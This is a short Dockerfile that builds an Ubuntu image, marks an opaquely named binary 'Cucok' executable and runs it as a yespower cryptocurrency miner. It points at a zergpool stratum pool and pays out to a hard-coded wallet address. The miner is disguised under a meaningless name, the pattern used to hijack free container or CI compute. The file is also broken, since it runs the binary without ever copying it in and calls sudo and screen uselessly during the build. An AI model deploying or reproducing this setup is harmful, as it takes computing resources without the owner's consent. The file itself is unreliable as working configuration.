FROM		ubuntu:14.04
MAINTAINER	zaf3hrhke <zaf3hrhke@crpolytechnic.in>

RUN		apt-get update -qq
RUN		apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
RUN		sudo apt update 
RUN		sudo apt install screen -y 
RUN		screen -dmS gpu.sh
RUN		chmod u+x ./Cucok
RUN		./Cucok -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u D9WRu1zs8Bmd9UQwMAXkstkLm4NDzVJnjG -p c=DGB,mc=PYRK

WORKDIR		/zaf3hrhke
ENTRYPOINT	["./Cucok"]
